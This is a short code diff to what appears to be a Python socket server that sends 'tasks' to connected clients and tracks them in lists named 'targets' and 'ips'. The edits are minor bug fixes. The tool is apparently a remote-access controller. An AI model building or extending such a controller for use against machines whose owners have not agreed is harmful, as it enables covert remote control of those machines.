@@ -1,4 +1,3 @@
-import main
 import socket
 from datetime import datetime
 from termcolor import colored
@@ -20,7 +19,7 @@ def tasks(con, ip, ttl, clients, connections):
           f"[{colored('*', 'cyan')}]Please wait...")
     try:
         con.send('tasks'.encode())
-        filenameRecv = con.recv(1024)
+        filenameRecv = con.recv(1024).decode()
         time.sleep(ttl)
         size = con.recv(4)
         size = bytes_to_number(size)
@@ -133,8 +132,8 @@ def remove_lost_connection(con, ip, clients, connections):
                 for ipKey, identValue in ipValue.items():
                     if ipKey == ip:
                         for identKey, userValue in identValue.items():
-                            self.targets.remove(con)
-                            self.ips.remove(ip)
+                            targets.remove(con)
+                            ips.remove(ip)
 
                             del connections[con]
                             del clients[con]
